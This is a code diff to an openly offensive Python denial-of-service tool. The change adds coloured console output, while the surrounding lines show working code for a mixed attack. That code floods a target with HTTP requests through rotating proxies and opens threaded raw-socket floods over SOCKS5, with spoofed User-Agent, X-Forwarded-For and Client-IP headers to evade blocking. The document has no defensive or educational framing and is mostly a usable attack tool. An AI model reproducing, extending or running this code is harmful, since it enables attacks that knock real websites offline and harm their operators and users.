@@ -16,6 +16,19 @@ import threading
 from urllib.parse import urlparse
 import requests
 
+# Pretty Print
+class Color:
+	VIOLET = '\033[95m'
+	BLUE = '\033[94m'
+	CYAN = '\033[96m'
+	GREEN = '\033[92m'
+	YELLOW = '\033[93m'
+	RED = '\033[91m'
+	RESET = '\033[0m'
+	BOLD = '\033[1m'
+	UNDERLINE = '\033[4m'
+
+
 # Argument Parsing
 if len(sys.argv) < 5:
     print(f"Usage: {sys.argv[0]} <target> <port> <threads> <proxyfile>")
@@ -61,7 +74,7 @@ def generate_headers(proxy):
         'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8'
     ])
     ua_platform = random.choice(['Windows', 'Mac', 'Linux'])
-    
+
     # Construct the header with the provided structure
     return {
         "Connection": "Keep-Alive",
@@ -94,7 +107,7 @@ def socket_flood(target_ip, port, proxy, path="/"):
             s.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
             s.settimeout(4)
             s.connect((target_ip, port))
-            
+
             # Custom GET request with the path and Host header
             headers = generate_headers(proxy)
             request = f"GET {path} HTTP/1.1\r\nHost: {urlparse(TARGET).netloc}\r\n" + \
@@ -106,11 +119,11 @@ def socket_flood(target_ip, port, proxy, path="/"):
                       f"User-Agent: {headers['User-Agent']}\r\nUpgrade-Insecure-Requests: 1\r\n" + \
                       f"Client-IP: {headers['Client-IP']}\r\nX-Forwarded-For: {headers['X-Forwarded-For']}\r\n" + \
                       f"X-Forwarded-Host: {headers['X-Forwarded-Host']}\r\nX-Forwarded-Proto: https\r\n\r\n"
-            
+
             s.sendall(request.encode('utf-8'))
-            print(f"Socket flood successful: {target_ip}:{port} with path '{path}' via {proxy}")
+            print(f"{Color.CYAN}[+] Socket Flood Successful: {Color.UNDERLINE}{Color.VIOLET}{target_ip}{Color.CYAN}{Color.RESET}{Color.CYAN}:{Color.VIOLET}{port} {Color.CYAN}With Path {Color.UNDERLINE}'{path}'{Color.RESET} {Color.CYAN}Via {Color.VIOLET}{proxy}")
         except Exception as e:
-            print(f"Socket flood failed: {proxy} - {e}")
+            print(f"{Color.YELLOW}[!] Socket Flood Failed: {Color.VIOLET}{proxy} {Color.YELLOW}- {e}")
             s.close()
             continue
 
@@ -123,9 +136,9 @@ async def attack_http_async(session, proxy, scheme="http"):
 
     try:
         async with session.get(url, proxy=proxy_url, headers=headers, ssl=False) as response:
-            print(f"Attack successful: {response.status} - {url} via {proxy}")
+            print(f"{Color.GREEN}[+] HTTP Flood Successful: {Color.YELLOW}{response.status} {Color.GREEN}- {Color.UNDERLINE}{url}{Color.RESET} {Color.GREEN}Via {Color.VIOLET}{proxy}")
     except Exception as e:
-        print(f"Attack failed: {proxy} - {e}")
+        print(f"{Color.RED}[!] Attack Failed: {Color.VIOLET}{proxy} {Color.GREEN}- {Color.RED}{e}")
 
 # Main Function to Run Both Attacks Concurrently
 async def main():
@@ -136,16 +149,16 @@ async def main():
             proxy = random.choice(PROXIES)
             scheme = "https" if PORT == 443 else "http"
             tasks.append(attack_http_async(session, proxy, scheme))
-        
+
         # Start socket flood in separate threads using proxies
         for _ in range(THREADS):
             proxy = random.choice(PROXIES)
             threading.Thread(target=socket_flood, args=(urlparse(TARGET).netloc, PORT, proxy, PATH)).start()
-        
+
         # Wait for the HTTP/HTTPS tasks to complete
         await asyncio.gather(*tasks)
 
 # Entry Point
 if __name__ == "__main__":
-    print(f"Starting mixed attack on {TARGET}:{PORT} with {THREADS} threads.")
+    print(f"{Color.GREEN}[+] Starting Mixed Attack on {Color.UNDERLINE}{Color.VIOLET}{TARGET}{Color.RESET}{Color.GREEN}:{Color.VIOLET}{PORT} {Color.GREEN}With {Color.VIOLET}{THREADS} {Color.GREEN}Threads.")
     asyncio.run(main())
